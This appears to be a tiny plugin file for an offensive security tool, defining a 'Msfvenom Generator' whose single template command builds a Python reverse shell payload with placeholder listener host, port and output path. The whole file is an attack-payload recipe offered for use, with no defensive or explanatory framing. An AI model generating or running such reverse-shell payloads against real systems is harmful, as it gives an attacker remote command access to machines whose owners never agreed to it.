class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Generate a reverse meterpreter shell into a python file."
    function    = "Msfvenom Generator"
    liner       = 'msfvenom -p cmd/unix/reverse_python lhost="TARGET" lport=PORT -f raw > FILE_PATH.py'
